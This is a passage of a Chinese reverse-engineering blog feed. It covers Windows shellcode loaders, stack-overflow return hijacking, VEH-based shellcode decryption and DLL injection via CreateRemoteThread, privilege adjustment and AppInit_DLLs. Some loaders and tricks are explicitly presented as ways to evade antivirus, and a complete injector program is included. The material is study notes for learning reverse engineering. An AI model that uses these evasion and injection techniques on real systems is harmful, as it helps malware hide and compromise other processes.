&amp;dold);////强制转换为函数((void(*)())Memory)();return 0;}</code></pre><p>因为杀毒软件可能将代码上传到云端跑（因为存在一些敏感行为，VirtualProtect等），这时候我们的shellcode可能被识别，所以我们要避免VirtualProtect操作，那么如何创建可读可写可执行的段呢。这时候就用到了预处理#pragma</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("vdata")unsigned char  shellcode[] ="\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C""\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53""\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B""\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75""\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD""\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE""\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24""\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03""\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9""\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61""\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";#pragma data_seg()//创建段，名称为vdata#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性int main(){//分配内存，并设置为可读可写可执行，大小为shellcode的大小LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);if (Memory == NULL)//当开辟失败时，直接结束{return 1;}//将shellcode复制到内存中memcpy(Memory, shellcode, sizeof(shellcode));//DWORD dold;//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);//强制转换为函数((void(*)())Memory)();return 0;}</code></pre><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649557566937.png"></p><h1 id="0x06-栈溢出"><a href="#0x06-栈溢出" class="headerlink" title="0x06-栈溢出"></a>0x06-栈溢出</h1><h2 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h2><p>首先要先了解X86栈和函数调用的机制</p><p>首先先把call的下一条地址压入栈中，再把ebp压入栈，最后提升栈底，也就是mov ebp,esp，而函数内部的变量起始地址是ebp-0x04，依次往后，当给变量赋值过大的值时，可能会覆盖函数结束时ret的值，进而执行我们的shellcode</p><blockquote><p>数组的赋值是从低地址往高地址赋值</p></blockquote><p>所以我们可以通过数组越界覆盖ret原本的地址</p><p>代码</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;iostream&gt;//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")void Decshellcode(){//完成恶意代码的释放、解密、执行MessageBoxA(0, "不要再打了", "我错了", MB_OK);}#pragma optimize("",off)int main(){int a = 2022;//0int arr[2] = { 1,2 };//1,2int ti = 23;//3arr[5] = (int)Decshellcode;return 0;}#pragma optimize("",on)</code></pre><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578699864.png"></p><p>这里会先把0xD61212压入栈中</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578767663.png"></p><p>然后将ebp的值压入栈</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578844982.png" alt="ebp入栈"></p><p>提升栈底就不看了，来看变量的赋值过程，可以看到是从栈底往低地址压入的</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579064005.png"></p><p><strong>数组入栈</strong></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579162383.png"></p><p>可以看到这里是不一样的，数组下标小的元素在低地址，所以可以通过数组越界覆盖原本压入的call下一条地址</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579335339.png"></p><p>arr[0]是首元素，那么arr[5]对应的就是ret的地址</p><pre class="language-c" data-language="c"><code class="language-c">arr[5] = (int)Decshellcode;</code></pre><p>将shellcode的地址覆盖ret的地址</p><p>注意要有一个值占用arr[4]的值，或者直接使用arr[4]访问即可。</p><h2 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h2><p>因为在Main函数中执行恶意代码是很容易被察觉的，所以我们要阻断Main函数和恶意代码的联系</p><p>我们需要做到既不调用函数，又能让函数执行，即栈溢出</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;void Decshellcode(){//完成恶意代码的释放、解密、执行MessageBoxA(0, "不要再打了", "我错了", MB_OK);}#pragma optimize("",off)int main(){int a = 2022;int arr[2] = { 1,2 };int ti = 23;arr[5] = (int)Decshellcode;//return 0;}#pragma optimize("",on)</code></pre><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559630756.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为什么会执行呢，我们知道调用函数在汇编中要有call，但是我们并没有发现call指令</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559733763.png"></p><h1 id="0x07-shellcode的加密与释放"><a href="#0x07-shellcode的加密与释放" class="headerlink" title="0x07-shellcode的加密与释放"></a>0x07-shellcode的加密与释放</h1><p>即使我们对shellcode代码进行了加密，但是我们的shellcode一定会被解密并释放出来，这时候就难以绕过检测，所以我们要将我们的shellcode执行完就被擦除掉，让其不留痕迹。</p><p>这时候就需要异常处理机制（VEH）和栈溢出同时利用，对逐条恶意代码指令进行解密，然后调用，注意再每条指令最后加上CC，然后解密完代码后再重新指向llcode，让其触发异常。</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649571545227.png"></p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("ldata")char trapcode[] = "*";unsigned long long llcode = 204;//CC 00 00 00INT3#pragma data_seg()#pragma comment(linker,"/SECTION:ldata,RWE")void Decshellcode(){llcode = 0xF333333333333333;llcode &lt;&lt;= 2;char* data = (char*)&amp;llcode;/** 解密shellcode 并且执行* len 解密后的指令长度* data 把解密后的指令写入data* 比如 push ebp 就向data写入0x55* 每次解密一条指令 不要用超过7字节的指令和跳转指令*/MessageBoxA(0, "不要再打辣", "停下", MB_OK);return ;}long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val){if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT){Decshellcode();val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;return EXCEPTION_CONTINUE_EXECUTION;}elsereturn EXCEPTION_CONTINUE_SEARCH;}#pragma optimize("",off)int main(){AddVectoredExceptionHandler(1, ExceptionHandle);int bilibili = 2020;int arr[2] = { 1,2 };int ti = 23;arr[5] = (int)&amp;llcode;return 0;}#pragma optimize("",on)</code></pre><p><a href="https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html">https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html</a></p><p><a href="https://bbs.pediy.com/thread-190668.htm">https://bbs.pediy.com/thread-190668.htm</a></p><p>AddVectoredExceptionHandler是异常处理机制try和except的封装，val-&gt;ExceptionRecord-&gt;ExceptionCode记录着异常的类型</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581840737.png"></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581929518.png"></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649582032897.png"></p><h1 id="shellcode注入"><a href="#shellcode注入" class="headerlink" title="shellcode注入"></a>shellcode注入</h1><p>当然shellcode注入不止这种，还有其他的方法</p><p><a href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021">https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021</a></p><p><a href="https://cloud.tencent.com/developer/article/1787191">https://cloud.tencent.com/developer/article/1787191</a></p><p>shellcode加密</p><p><a href="https://www.cnblogs.com/LyShark/p/13033722.html">https://www.cnblogs.com/LyShark/p/13033722.html</a></p><h1 id="0x08-隐藏API"><a href="#0x08-隐藏API" class="headerlink" title="0x08-隐藏API"></a>0x08-隐藏API</h1><p>利用栈溢出隐藏API</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Shellcode&quot;&gt;&lt;a href=&quot;#0x00-Shellcode&quot; class=&quot;headerlink&quot; title=&quot;0x00-Shellcode&quot;&gt;&lt;/a&gt;0x00-Shellcode&lt;/h1&gt;&lt;p&gt;什么是shellcode&lt;/p&gt;
&lt;bloc</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>DLL注入</title>
    <link href="https://gift1a.github.io/2022/04/09/DLL%E6%B3%A8%E5%85%A5/"/>
    <id>https://gift1a.github.io/2022/04/09/DLL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-09T13:31:05.000Z</published>
    <updated>2022-04-20T01:24:19.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-远程线程注入"><a href="#0x00-远程线程注入" class="headerlink" title="0x00-远程线程注入"></a>0x00-远程线程注入</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>线程注入，是通过开启远程线程的方式，将DLL加载到目标宿主进程中的常用方式。</p><p>由于WinNT系统下进程空间的独立性，获取其他进程的信息，就需要进入目标进程空间的方式，而使用线程注入可以轻松实现。</p><blockquote><p>使用LoadLibrary动态加载DLL</p><p>使用GetProcAddress获取DLL中导出函数的指针</p></blockquote><h3 id="DLL的分类"><a href="#DLL的分类" class="headerlink" title="DLL的分类"></a>DLL的分类</h3><p>在VS的编译环境下，DLL又分为三类：</p><blockquote><p>非MFC的DLL——即使用SDK API进行编程，能被其他所有语言调用</p><p>MFC规则DLL——可以使用MFC进行编程，能被其他所有语言调用</p><p>MFC扩展DLL——可以使用MFC进行编程，但只能被用MFC编写的程序调用</p></blockquote><p>MFC——Microsoft Foundation Class-Library是微软用C++对API进行的封装，全部封装成了类，简化了使用</p><h3 id="DLL的入口点和参数"><a href="#DLL的入口点和参数" class="headerlink" title="DLL的入口点和参数"></a>DLL的入口点和参数</h3><pre class="language-c" data-language="c"><code class="language-c">BOOL WINAPI DllMain(    HINSTANCE hinstDLL,  // handle to DLL module    DWORD fdwReason,     // reason for calling function    LPVOID lpReserved )  // reserved{    // Perform actions based on the reason for calling.    switch( fdwReason )     {         case DLL_PROCESS_ATTACH:         // Initialize once for each new process.进程第一次链接DLL并通过它的入口点会得到这个参数         // Return FALSE to fail DLL load.            break;        case DLL_THREAD_ATTACH:         // Do thread-specific initialization.进程在空间中取消DLL的映射时会得到这个参数            break;        case DLL_THREAD_DETACH:         // Do thread-specific cleanup.每当新线程创建时，系统会对所有映射的DLL传入此参数调用入口函数            break;        case DLL_PROCESS_DETACH:         // Perform any necessary cleanup.每当线程退出或者返回时时，系统会对所有映射的DLL传入此参数要求执行对应清理工作            break;    }    return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><h2 id="DLL编写与导出"><a href="#DLL编写与导出" class="headerlink" title="DLL编写与导出"></a>DLL编写与导出</h2><p>DLL的导出函数使用</p><blockquote><p>extern “C” _declspec(dllexport)</p></blockquote><p>DLL的导入函数使用</p><blockquote><p>extern “C” _declspec(dllimport)</p></blockquote><p>其中，extern “C”作为一种编译约定，表示按照C语言的方式导出</p><blockquote><p> 由于C++支持函数重载，因此编译器编译函数的过程中会将函数的参数类型也加到编译后的代码中，而不仅仅是函数名；而C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，一般只包括函数名。 这样我们就可以直接通过函数名对DLL导出函数进行调用</p></blockquote><h3 id="DLL动态加载"><a href="#DLL动态加载" class="headerlink" title="DLL动态加载"></a>DLL动态加载</h3><p>既然我们要把DLL注入到进程中，那么需要先了解一下，进程是怎样调用DLL的</p><pre class="language-c" data-language="c"><code class="language-c">//使用LoadLibrary加载所需的DLL//LoadLibraryA和LoadLibraryW分别对应ANSI编码下和Unicode编码下，因为一般都是Unicode，所以一般用w，路径记得改为\\HMODULE hMod = LoadLibraryA(DLL路径);//定义导入函数指针typedef int (*ADD_IMPORT)(int a,int b);//定义一个返回值为int型的函数指针,这样ADD_IMPORT就是一个函数指针//使用GetProcAddress获取函数入口点ADD_IMPORT add_proc=(ADD_IMPORT)GetProcAddress(hMod,"ADD");//直接调用int result = add_proc(1,2);//释放句柄FreeLibrary(hMod);</code></pre><h2 id="线程注入"><a href="#线程注入" class="headerlink" title="线程注入"></a>线程注入</h2><h3 id="注入的可行性"><a href="#注入的可行性" class="headerlink" title="注入的可行性"></a>注入的可行性</h3><blockquote><p>kernel32.dll和user32.dll是两个在大部分程序上都会调用的DLL</p><p>同一个DLL，在不同进程中不一定被映射（加载）在同一个内存地址下</p><p>但是kernel32.dll和user32.dll除外，它们总是被映射到进程的内存首选地址</p><p>因此在所有使用这两个DLL的进程中，这两个DLL的内存地址是相同的</p><p>因此<strong>我们在本进程获取的kernel32.dll中函数的地址，在目标进程也是一样的</strong></p></blockquote><h3 id="线程注入过程"><a href="#线程注入过程" class="headerlink" title="线程注入过程"></a>线程注入过程</h3><blockquote><p>目标进程-&gt;开辟并传入DLL地址-&gt;开启远程线程-&gt;加载DLL-&gt;实现DLL的注入</p></blockquote><p>依次使用以下函数</p><pre class="language-c" data-language="c"><code class="language-c">OpenProcess()//获取目标进程的句柄VirtualAllocEx()//在进程中申请空间WriteProcessMemory()//向进程中写入DLL路径GetProcAddress()//取得函数LoadLibrary在DLL中的地址CreateRemoteThreadEx()//在目标进程中创建新线程使用LoadLibrary加载DLLWaitForSingleObject()//挂起线程，可以传递INFINITE指明要无限期等待下去，等待线程执行完再执行下一步CloseHandle()//关闭句柄</code></pre><p> CreateRemoteThread()函数</p><pre class="language-c" data-language="c"><code class="language-c">HANDLE WINAPI CreateRemoteThread(    LPSECURITY_ATTRIBUTES   lpThreadAttributes, //线程安全相关的属性，常置为NULL    SIZE_T                  dwStackSize,        //新线程的初始化栈在大小，可设置为0    LPTHREAD_START_ROUTINE  lpStartAddress,     //被线程执行的回调函数，也称为线程函数    LPVOID                  lpParameter,        //传入线程函数的参数，不需传递参数时为NULL    DWORD                   dwCreationFlags,    //控制线程创建的标志    LPDWORD                 lpThreadId          //传出参数，用于获得线程ID，如果为NULL则不返回线程ID);</code></pre><p>目标其实就是让目标进程调用<code>LoadLibrary()</code>加载dll </p><blockquote><p>将线程函数指定为LoadLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p><p>CreateRemoteThread()原意是在外部进程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p></blockquote><p>Inject.cpp</p><pre class="language-c" data-language="c"><code class="language-c">#include "windows.h"#include "tchar.h"BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath){    HANDLE hProcess = NULL, hThread = NULL;    HMODULE hMod = NULL;    LPVOID pRemoteBuf = NULL;    //确定路径需要占用的缓冲区大小    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    // #1. 使用OpenProcess函数获取目标进程句柄（PROCESS_ALL_ACCESS权限）    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))    {        _tprintf(L"OpenProcess(%d) failed!!! [%d]\n", dwPID, GetLastError());        return FALSE;    }    // #2. 使用VirtualAllocEx函数在目标进程中分配内存，大小为szDllName      // VirtualAllocEx函数返回的是hProcess指向的目标进程的分配所得缓冲区的内存地址,最后一个参数表示开辟内存的属性    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    // #3.  将myhack.dll路径 ("c:\\myhack.dll")写入目标进程中分配到的内存    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    // #4. 获取LoadLibraryA() API的地址      // 这里主要利用来了kernel32.dll文件在每个进程中的加载地址都相同这一特点，所以不管是获取加载到         // InjectDll.exe还是notepad.exe进程的kernel32.dll中的LoadLibraryW函数的地址都是一样的。这里的加载地      // 址相同指的是在同一次系统运行中，如果再次启动系统kernel32.dll的加载地址会变，但是每个进程的      // kernerl32.dll的加载地址还是一样的。    hMod = GetModuleHandle(L"kernel32.dll");    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryW");    // #5. 在目标进程notepad.exe中运行远程线程      // pThreadProc = notepad.exe进程内存中的LoadLibraryW()地址      // pRemoteBuf = notepad.exe进程内存中待加载注入dll的路径字符串的地址    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    //同样，记得关闭句柄    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;}int _tmain(int argc, TCHAR* argv[]){    if (argc != 3)    {        _tprintf(L"USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n", argv[0]);        return 1;    }    // inject dll    if (InjectDll((DWORD)_tstol(argv[1]), argv[2]))        _tprintf(L"InjectDll(\"%s\") success!!!\n", argv[2]);    else        _tprintf(L"InjectDll(\"%s\") failed!!!\n", argv[2]);    return 0;}</code></pre><p>inject.dll</p><pre class="language-c" data-language="c"><code class="language-c">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include&lt;windows.h&gt;#include&lt;stdio.h&gt;extern "C" _declspec(dllexport) void Print(){    printf("helloworld");}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        MessageBoxA(0, "注入成功", "Hint", MB_OK);        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655410419.png"></p><p>可以看到在notepad.exe的进程中注入了inject.dll</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655358785.png"></p><h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p><a href="https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;utm_relevant_index=1">https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;utm_relevant_index=1</a></p><p>有时候需要提升进程权限</p><blockquote><p>在枚举/结束系统进程/或操作系统服务时，会出现自己权限不足而失败的情况，这时就需要提升自己进程到系统权限</p></blockquote><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><blockquote><p><strong>Windows的每个用户登录时，系统会产生一个访问令牌(access token)，其中关联了当前用户的权限信息，用户登录后创建的每一个进程都含有用户access token的拷贝。当进程试图执行某些需要特殊权限的操作或者是访问受保护的内核对象时，系统会检查其access token中的权限信息以决定是否授权操作。</strong></p></blockquote><p>Administrator组成员的access token中会含有一些可以执行系统级操作的特权(privileges)，如终止任意进程、关闭\重启系统、加载设备驱动和更改系统时间等，不过这些权限默认是被禁用的</p><p> 当Administrator组成员创建的进程中包含一些需要特权的操作时，进程必须首先打开这些禁用的特权以提升自己的权限，否则系统将拒绝进程的操作。 </p><blockquote><p><strong>windows以字符串的形式表示系统特权，如”SeCreatePageFilePrivilege“表示该特权用于创建页面文件，”SeDebugPrivilege“表示该特权可用于调试及更改其他进程的内存，为了方便使用这些字符串，微软在winnt.h定义了一组宏，如#define SE_DEBUG_NAME TEXT(“SeDebugPrivilege”)</strong></p></blockquote><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649725957948.png" alt="权限列表"></p><p>在vs的定义也可以看到，这些宏定义对应了不同的权限，可以使用LookupPrivilege函数得到对应权限的LUID</p><blockquote><p><strong>虽然Windows使用字符串表示特权，但查询或更改特权的API需要LUID来引用相应的特权，LUID表示 local unique identifier ，在系统中是唯一的。为了提升进程权限到指定的特权，我们必须找到特权对应的LUID，这时候就需要调用LookupPrivilege函数，获取到特权对应的LUID时，我们要打开该特权，此时要用到LUID_AND_ATTRIBUTES结构</strong></p></blockquote><p>其定义如下</p><pre class="language-c" data-language="c"><code class="language-c">typedef struct _LUID_AND_ATTRIBUTES {    LUID Luid;    DWORD Attributes;} LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES;</code></pre><p>当Attributes的值取SE_PRIVILEGE_ENABLED时将打开LUID对应的特权。设置完成后</p><blockquote><p><strong>AdjustTokenPrivileges函数通知操作系统将指定的access token权限中的特权置为打开状态，前面我们说过，进程执行需要特列权限的操作时，系统将检查其access token，因此更改了进程的access token特权设置，也就是更改了所属进程的特权设置</strong></p></blockquote><p>函数定义如下</p><pre class="language-c" data-language="c"><code class="language-c">BOOL WINAPI AdjustTokenPrivileges(  __in          HANDLE TokenHandle,  __in          BOOL DisableAllPrivileges,  __in_opt      PTOKEN_PRIVILEGES NewState,  __in          DWORD BufferLength,  __out_opt     PTOKEN_PRIVILEGES PreviousState,  __out_opt     PDWORD ReturnLength);</code></pre><p>TokenHandle是要更改特权设置的access token的句柄，DisableAllPrivileges表示是否禁用该access token的所有特权，NewState用来传递新的特权设置，注意它的类型是PTOKEN_PRIVILEGES，它是TOKEN_PRIVILEGES结构的指针</p><p>TOKEN_PRIVILEGES定义如下</p><pre class="language-c" data-language="c"><code class="language-c">typedef struct _TOKEN_PRIVILEGES {    DWORD PrivilegeCount;    LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</code></pre><blockquote><p><strong>其中ANYSIZE_ARRAY被定义为1，可以看到TOKEN_PRIVILEGES中包含了用于设置特权信息的LUID_AND_ATTRIBUTES结构，在使用时，只需要将PrivilegeCount赋为1，然后把Privileges数组的第1个元素（Privileges[0]）的Luid域设置为指定特权的Luid，再将其Attributes域设置为SE_PRIVILEGE_ENABLED，就可以完成TokenHandle表示的access token权限的提升了</strong></p></blockquote><pre class="language-c" data-language="c"><code class="language-c">BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){TOKEN_PRIVILEGES tp;HANDLE hToken;LUID luid;//获取当前进程的access token句柄if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&amp;hToken)){_tprintf(L"OpenProcessToken error: %u\n", GetLastError());return FALSE;}//查找newprivileges参数对应的Luid，并将结果写入tp.Privileges[0]的Luid域中if (!LookupPrivilegeValue(NULL,           // lookup privilege on local systemlpszPrivilege,  // privilege to lookup &amp;luid))        // receives LUID of privilege{_tprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());return FALSE;}//设置tp的结构tp.PrivilegeCount = 1;tp.Privileges[0].Luid = luid;if (bEnablePrivilege)tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;elsetp.Privileges[0].Attributes = 0;//通知操作系统更改权限// Enable the privilege or disable all privileges.if (!AdjustTokenPrivileges(hToken,FALSE,&amp;tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL)){_tprintf(L"AdjustTokenPrivileges error: %u\n", GetLastError());return FALSE;}if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){_tprintf(L"The token does not have the specified privilege. \n");return FALSE;}return TRUE;}</code></pre><h1 id="0x01-注册表注入"><a href="#0x01-注册表注入" class="headerlink" title="0x01-注册表注入"></a>0x01-注册表注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Windows操作系统的注册表默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658626858.png"></p><p>在注册表编辑器中，将要注入的DLL路径字符串写入AppInit_DLLs项目，然后把LoadAppInit_DLLs的项目值设置为1.重启后，指定DLL会注入所有进程。</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658441593.png"></p><h1 id="0x02-SetWindowsHookEx"><a href="#0x02-SetWindowsHookEx" class="headerlink" title="0x02-SetWindowsHookEx()"></a>0x02-SetWindowsHookEx()</h1><p>在另一篇文章Hook写了，就不过多介绍</p><p>下面是更详细的解释</p><p><a href="https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3">https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3</a></p><p>注入DLL的第三个方法就是消息钩取</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658514411.png"></p><h1 id="0x03-还有其他方法"><a href="#0x03-还有其他方法" class="headerlink" title="0x03-还有其他方法"></a>0x03-还有其他方法</h1><p><a href="https://bbs.pediy.com/thread-253918.htm">https://bbs.pediy.com/thread-253918.htm</a></p>]]></content>
    
    
    <summary type="html">《逆向工程核心原理》DLL注入</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Windows内核基础</title>
    <link href="https://gift1a.github.io/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/"/>
    <id>https://gift1a.github.io/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/</id>
    <published>2022-04-09T11:04:09.000Z</published>
    <updated>2022-04-16T11:50:40.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-权限级别"><a href="#0x00-权限级别" class="headerlink" title="0x00-权限级别"></a>0x00-权限级别</h1><p>先来看一下特权级环，从里往外权限逐渐降低</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650108857255.png" alt="特权级环"></p><blockquote><p><strong>系统内核层，又叫零环（Ring 0，简称“R0”；与此对应的应用层叫3环，即Ring 3，简称“R3”），实际上是CPU的4个运行级别中的一个</strong></p></blockquote><p>CPU设计者将CPU的运行级别从内往外分为4个，依次为R0、R1、R2、R3，运行权限从R0到R3依次降低。CPU设计制造商在设计之初是让R0运行内核，让R1、R2运行驱动设备，让R3运行应用程序的。</p><p>操作系统设计者与开发商在设计操作系统（例如微软Windows和开源社区的Linus编写的Linux）的时候，为了让工作变得简单，<strong>并没有使用R1和R2两个级别，而是将设备驱动运行在与内核一个级别的R0级</strong></p><p>在AMD64CPU诞生之后，CPU的设计者干脆也和操作吸引保持一致，只保留了R0和R3两个级别</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109580425.png" alt="Windows XP体系结构简图"></p><p>HAL是一个可加载的核心模块HAL.DLL，它为运行在Windows XP上的硬件平台提供低级接口。Windows XP的执行体是NTOSKRNL.EXE的上层（内核是其下层）。用户层导出并且可以调用的函数接口在NTDLL.DLL中，通过Win32 API或其他环境子系统对它们进行访问</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109820013.png"></p><h1 id="0x01-内存空间布局"><a href="#0x01-内存空间布局" class="headerlink" title="0x01-内存空间布局"></a>0x01-内存空间布局</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-权限级别&quot;&gt;&lt;a href=&quot;#0x00-权限级别&quot; class=&quot;headerlink&quot; title=&quot;0x00-权限级别&quot;&gt;&lt;/a&gt;0x00-权限级别&lt;/h1&gt;&lt;p&gt;先来看一下特权级环，从里往外权限逐渐降低&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/202</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理</title>
    <link href="https://gift1a.github.io/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
